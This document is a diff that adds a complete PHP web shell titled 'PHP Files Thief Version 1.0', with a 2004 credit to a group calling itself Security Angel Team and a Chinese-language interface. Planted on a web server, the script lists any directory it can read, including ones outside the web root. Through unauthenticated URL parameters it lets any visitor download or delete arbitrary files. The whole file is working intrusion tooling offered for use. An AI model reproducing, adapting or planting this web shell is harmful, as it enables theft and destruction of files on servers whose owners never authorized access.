@@ -1,0 +1,165 @@
+<?php
+/*
++---------------------------------------------------------------------------------------------------+
+| PHP Files Thief Version 1.0                                                                       |
+| This script can be download any files outside the Web directory if that directory allow to read   |
+| ================================================================================================= |
+| Codz by Angel                                                                                     |
+| (c) 2004 Security Angel Team                                                                      |
+| http://www.4ngel.net                                                                              |
+| ================================================================================================= |
+| Web: http://www.4ngel.net                                                                         |
+| Email: 4ngel@21cn.com                                                                             |
+| Date: May 29th, 2004                                                                              |
++---------------------------------------------------------------------------------------------------+
+*/
+
+// 可以解决magic_quotes_gpc的限制
+function stripslashes_array(&$array) {
+	while(list($key,$var) = each($array)) {
+		if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
+			if (is_string($var)) {
+				$array[$key] = stripslashes($var);
+			}
+			if (is_array($var))  {
+				$array[$key] = stripslashes_array($var);
+			}
+		}
+	}
+	return $array;
+}
+
+// 判断 magic_quotes_gpc 状态
+if (get_magic_quotes_gpc()) {
+    $_GET = stripslashes_array($_GET);
+}
+
+// 下载文件
+if ($downfile) {
+	if (!@is_file($downfile)) {
+		echo "<script>alert(\"你要下的文件不存在\")</script>";
+	}
+	$filename = basename($downfile);
+	$filename_info = explode('.', $filename);
+	$fileext = $filename_info[count($filename_info)-1];
+	header('Content-type: application/x-'.$fileext);
+	header('Content-Disposition: attachment; filename='.$filename);
+	header('Content-Description: PHP3 Generated Data');
+	readfile($downfile);
+	exit;
+}
+
+// 删除文件
+if(@$delfile!="") {
+	if(file_exists($delfile)) {
+		@unlink($delfile);
+	} else {
+		$exists="1";
+		echo "<script>alert(\"文件已不存在\")</script>";
+	}
+	if(!file_exists($delfile)&&$exists!="1") {
+		echo"<script>alert(\"删除成功\")</script>";
+	} else {
+		echo"<script>alert(\"删除失败\")</script>";
+	}
+}
+?>
+<html>
+<head><title>PHP Files Thief Version 1.0</title>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312";>
+<STYLE type="text/css">
+body {font-family: "Courier New", "Verdana", "Tahoma"; font-size: 12px;}
+td {font-family: "Courier New", "Verdana", "Tahoma"; font-size: 12px;}
+input {font-family: "Courier New", "Verdana", "Tahoma";font-size: 12px;}
+.title {font-family: "Verdana", "Tahoma";font-size: 22px;font-weight: bold;}
+</STYLE>
+</head>
+<body>
+<table width="100%" border="0" cellspacing="1" cellpadding="3">
+  <tr>
+    <td class="title">PHP Files Thief</td>
+    <td align="right" valign="bottom"><font color="#FF0000"><?php echo "当前操作系统: ".PHP_OS."<br>";?></font></td>
+  </tr>
+</table>
+<hr>
+<table width="100%" border="0" cellspacing="1" cellpadding="3">
+ <form action="<?=$PHP_SELF?>" method="get">
+  <tr>
+    <td>
+  跳转目录：
+      <input type="text" name="dir" size="40">
+      <input type="submit" value="GO">
+    </td>
+  </tr>
+  </form>
+  <tr>
+    <td>当前目录：<?php
+if (!isset($dir) or empty($dir)) {
+	$dir=str_replace('\\','/',dirname(__FILE__));
+	echo "<font color=\"#ff0000\">".$dir."</font>";
+} else {
+	$dir=$_GET['dir'];
+	echo "<font color=\"#ff0000\">".$dir."</font>";
+}
+?></td>
+  </tr>
+</table>
+<hr>
+<table width="100%" border="0" cellpadding="3" cellspacing="1">
+  <tr> 
+	<td><b>子目录</b></td>
+  </tr>
+<?php
+$dirs=@opendir($dir);
+while ($file=@readdir($dirs)) {
+	$b="$dir/$file";
+	$a=@is_dir($b);
+	if($a=="1"){
+	if($file!=".."&&$file!=".")	{
+		echo "<tr>\n";
+		echo "  <td>□ <a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">$file</a></td>\n";
+		echo "</tr>\n";
+	} else {
+		if($file=="..")
+		echo "<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">上级目录</a>";
+		}
+	}
+}
+@closedir($dirs); 
+?>
+</table>
+<hr>
+<table width="100%" border="0" cellpadding="3" cellspacing="1">
+          <tr> 
+            <td><b>文件名</b></td>
+            <td><b>日期</b></td>
+            <td><b>大小</b></td>
+            <td><b>操作</b></td>
+          </tr>
+<?php
+$dirs=@opendir($dir);
+while ($file=@readdir($dirs)) {
+	$b="$dir/$file";
+	$a=@is_dir($b);
+	if($a=="0"){
+	$size=@filesize("$dir/$file");
+	$size=$size/1024 ;
+    $size= @number_format($size, 3);    
+	$lastsave=@date("Y-n-d H:i:s",filectime("$dir/$file"));
+    echo "<tr>\n";
+    echo "<td>□ $file</td>\n";
+	echo "  <td>$lastsave</td>\n";
+    echo "  <td>$size KB</td>\n";
+	echo "  <td><a href=\"?downfile=".urlencode($dir)."/".urlencode($file)."\">下载</a> | <a href=\"?dir=".urlencode($dir)."&delfile=".urlencode($dir)."/".urlencode($file)."\">删除</a></td>\n";
+	echo "</tr>\n";
+	}
+}
+@closedir($dirs); 
+?>
+</table>
+<hr>
+<i>Copyright (C) 2004 Security Angel Team [S4T] All Rights Reserved. Get the latest version at <a
+href="http://www.4ngel.net" target="_blank">www.4ngel.net</a>.<br>
+Powered by PHP Files Thief Version 1.0</i>
+</body>
+</html>
